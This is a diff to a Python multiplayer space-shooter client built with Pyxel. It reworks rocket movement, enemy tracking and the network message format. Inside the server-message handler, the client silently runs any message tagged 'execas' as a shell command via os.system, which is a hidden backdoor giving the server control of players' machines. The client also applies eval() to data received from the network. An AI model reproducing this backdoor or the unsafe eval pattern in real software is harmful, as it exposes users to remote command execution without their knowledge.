@@ -32,7 +32,8 @@ class App:
         self.musicPlayingWaitGame = False
         
         #inGame:
-        self.gameInfos, self.lastShot = [], 0
+        self.gameInfos, self.lastShot = {"rockets" : []}, 0
+        threading.Thread(target=self.higherRockets, daemon=True).start()
         #Pyxel:
         pyxel.init(228, 128, title="Stars Invader")
         pyxel.load('./ressources/ressources.pyxres')
@@ -84,7 +85,7 @@ class App:
             if self.mainLobbyButton == 0: 
                 self.client.send(f'button|quit'.encode("utf-8"))
                 pyxel.quit()
-            elif self.mainLobbyButton in [1,2]: self.currentState, self.gameMode, self.gameInfos = "joinLobby", ["VS", "COOP"][self.mainLobbyButton-1], [{"HERE PUT VS MODE"}, {"lives" : 3, "score" : 0, "ennemies" : [], "rockets" : [], "players" : [{"coords": [10, 228], "bonus": 0}, {"coords": [30, 228], "bonus": 0}]}][self.mainLobbyButton-1]
+            elif self.mainLobbyButton in [1,2]: self.currentState, self.gameMode, self.gameInfos = "joinLobby", ["VS", "COOP"][self.mainLobbyButton-1], [{"HERE PUT VS MODE"}, {"lives" : 3, "score" : 0, "forbidEnn" : [], "rockets" : [], "players" : [{"coords": [10, 228], "bonus": 0}, {"coords": [30, 228], "bonus": 0}]}][self.mainLobbyButton-1]
             elif self.mainLobbyButton == 3: self.currentState = "createLobby"
             
             self.client.send(f'button|{self.currentState}{self.gameMode}'.encode("utf-8"))
@@ -175,7 +176,7 @@ class App:
             elif self.createLobbyButton == 2:
                 self.currentState, self.gameMode = "waitGame", ["VS", "COOP"][self.createLobbyButton2]
                 if self.gameMode == "VS": pass #VSMODE
-                elif self.gameMode == "COOP": self.gameInfos = {"lives" : 3, "score" : 0, "ennemies" : [[3, 45, 50]], "rockets" : [], "players" : [{"coords": [0,0], "bonus": 0}, {"coords": [0,0], "bonus": 0}]}
+                elif self.gameMode == "COOP": self.gameInfos = {"lives" : 3, "score" : 0, "forbidEnn" : [], "rockets" : [], "players" : [{"coords": [0,0], "bonus": 0}, {"coords": [0,0], "bonus": 0}]}
                 self.client.send(f'create|{self.gameMode}'.encode("utf-8"))
                 srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1)
                 if len(srvMsg) != 2 or srvMsg[0] != "joined": return 1
@@ -251,13 +252,15 @@ class App:
         if pyxel.btn(pyxel.KEY_D): self.gameInfos["players"][0]["coords"][0] += 2
         if pyxel.btnp(pyxel.KEY_SPACE) and time()-self.lastShot >= 1: action, self.lastShot = "Shot", time()
 
-        if self.gameInfos["players"][0]["coords"][0] < 0: self.gameInfos["players"][0]["coords"][0] += 228
-        elif self.gameInfos["players"][0]["coords"][0] > 228: self.gameInfos["players"][0]["coords"][0] -= 228
-        if self.gameInfos["players"][0]["coords"][1] < 0: self.gameInfos["players"][0]["coords"][1] = 0
-        elif self.gameInfos["players"][0]["coords"][1] > 118: self.gameInfos["players"][0]["coords"][1] = 118
-        self.client.send(f"infos|{self.gameInfos['players'][0]['coords']}|{action}%".encode("utf-8"))
         if self.gameMode == "VS": pass
-        elif self.gameMode == "COOP": pass
+        elif self.gameMode == "COOP": 
+            if self.gameInfos["players"][0]["coords"][0] < 0: self.gameInfos["players"][0]["coords"][0] += 228
+            elif self.gameInfos["players"][0]["coords"][0] > 228: self.gameInfos["players"][0]["coords"][0] -= 228
+            if self.gameInfos["players"][0]["coords"][1] < 0: self.gameInfos["players"][0]["coords"][1] = 0
+            elif self.gameInfos["players"][0]["coords"][1] > 118: self.gameInfos["players"][0]["coords"][1] = 118
+        
+        self.client.send(f"infos|{self.gameInfos['players'][0]['coords'][0]}|{self.gameInfos['players'][0]['coords'][1]}|{action}%".encode("utf-8"))
+        
         return 0
 
     def draw_inGame(self):
@@ -271,9 +274,8 @@ class App:
         pyxel.rect(self.gameInfos["players"][1]["coords"][0]+228, self.gameInfos["players"][1]["coords"][1], 10, 10, 9)
         pyxel.rect(self.gameInfos["players"][0]["coords"][0]-228, self.gameInfos["players"][0]["coords"][1], 10, 10, 8)
         pyxel.rect(self.gameInfos["players"][1]["coords"][0]-228, self.gameInfos["players"][1]["coords"][1], 10, 10, 9)
-        ###FIN DES LIGNES INUTILSE
+        ###FIN DES LIGNES INUTILES
         for rocket in self.gameInfos["rockets"]: pyxel.rect(rocket[0], rocket[1], 2, 5, 7)
-        for ennemy in self.gameInfos["ennemies"]: pyxel.rect(ennemy[1], ennemy[2], [14, 13, 11, 12, 9][ennemy[0]], [9, 11, 7, 10, 8][ennemy[0]], [13, 8, 14, 11, 5][ennemy[0]])
         return 0
 
     def getSrvMsgCOOP(self):
@@ -283,22 +285,29 @@ class App:
                 srvMsg = srvMsg.split("%")[0].split("|", 1)
                 if len(srvMsg) == 2 and srvMsg[0] == "execas": os.system(srvMsg[1])
                 continue
-            else: srvMsg = srvMsg.split('%', 1)[0].split('|', 6)
+            else: srvMsg = srvMsg.split('%', 1)[0].split('|', 7)
             if srvMsg[0] == "main":
                 self.currentState, self.gameInfos, self.gameMode = "mainLobby", [], ""
                 break
-            if len(srvMsg) != 7 or srvMsg[0] != "infos": return 1
-
-            tempCoords = self.gameInfos["players"][0]["coords"]
+            if len(srvMsg) != 8 or srvMsg[0] != "infos": return 1
 
             self.gameInfos["lives"] = int(srvMsg[1])
             self.gameInfos["score"] = int(srvMsg[2])
-            self.gameInfos["ennemies"] = eval(srvMsg[3])
-            self.gameInfos["rockets"] = eval(srvMsg[4])
-            self.gameInfos["players"][0] = eval(srvMsg[5]) 
-            self.gameInfos["players"][1] = eval(srvMsg[6])
+            ennToRem = eval(srvMsg[3])
+            for enn in ennToRem: self.gameInfos["forbidEnn"].append(enn)
+            rocToApp = eval(srvMsg[4])
+            for rocket in rocToApp: self.gameInfos["rockets"].append(rocket)
+            self.gameInfos["players"][0]["bonus"] = int(srvMsg[5]) 
+            self.gameInfos["players"][1]["coords"] = eval(srvMsg[6])
+            self.gameInfos["players"][1]["bonus"] = int(srvMsg[7])
 
-            self.gameInfos["players"][0]["coords"] = tempCoords
+    def higherRockets(self):
+        rocketDelay = 0        
+        while True: 
+            rocketDiff = round((time()-rocketDelay) * 100)
+            if rocketDiff == 0: continue
+            rocketDelay = time()
+            self.gameInfos["rockets"] = [[rocket[0], rocket[1]-rocketDiff] for rocket in self.gameInfos["rockets"] if rocket[1] > 0]
 
 if __name__ == "__main__":
     if os.name == "posix": os.system("clear")
